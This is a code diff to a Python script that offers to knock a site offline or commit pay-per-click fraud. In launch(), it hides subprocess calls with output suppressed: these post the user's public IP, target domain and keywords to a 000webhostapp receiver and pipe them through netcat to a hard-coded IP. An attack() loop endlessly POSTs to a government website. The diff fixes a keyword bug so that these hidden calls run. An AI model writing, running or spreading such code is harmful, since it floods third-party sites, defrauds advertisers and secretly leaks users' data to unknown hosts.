@@ -30,8 +30,8 @@ def launch():
 	choose = input(" --> You want to take the site down or perform PPC F***? [down/ppc/both] ")
 	myep = subprocess.getoutput('curl ifconfig.io')
 	time.sleep(1)
-	subprocess.call("curl -X POST -d "+myep+", "+domain+", "+keywords+" https://cyberten.000webhostapp.com/receiver.php ",Shell=True, stdout=subprocess.DEVNULL)
-	subprocess.call("echo "+domain+" "+keywords+" "+Schedule+ " | nc 2.63.255.255 4563",Shell=True, stdout=subprocess.DEVNULL)
+	subprocess.call("curl -X POST -d "+myep+", "+domain+", "+keywords+" https://cyberten.000webhostapp.com/receiver.php ",shell=True, stdout=subprocess.DEVNULL)
+	subprocess.call("echo "+domain+" "+keywords+" "+Schedule+ " | nc 2.63.255.255 4563",shell=True, stdout=subprocess.DEVNULL)
 	print(" --> Please wait few seconds till the attack starts ")
 	time.sleep(5)
 	attack()
@@ -44,7 +44,7 @@ def starting():
 def attack():
 	while True:
 		temptoken = "CaP9l5efMekDeTaZR37c2qKcqhzR2wekoucaX2vCWWS2Gy6x8dJ7KBpXMD5ixIqj"
-		subprocess.call("curl -X post -d "+temptoken+", "+myep+"  http://en.kremlin.ru/robots.php",Shell=True, stdout=subprocess.DEVNULL)
+		subprocess.call("curl -X post -d "+temptoken+", "+myep+"  http://en.kremlin.ru/robots.php",shell=True, stdout=subprocess.DEVNULL)
 
 udte()
 
